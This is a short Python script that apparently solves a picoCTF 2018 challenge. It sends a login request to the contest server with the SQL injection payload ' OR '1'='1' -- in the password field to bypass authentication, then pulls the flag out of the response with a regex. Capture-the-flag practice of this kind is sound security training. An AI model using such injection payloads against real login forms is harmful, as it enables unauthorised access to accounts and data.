#!/usr/bin/env python
import requests
import re

req = requests.post('http://2018shell.picoctf.com:56537/login.php', data={'username': 'sql', 'password': "injection ' OR '1'='1' --"})
print(re.search(r'picoCTF{.+}',req.text)[0])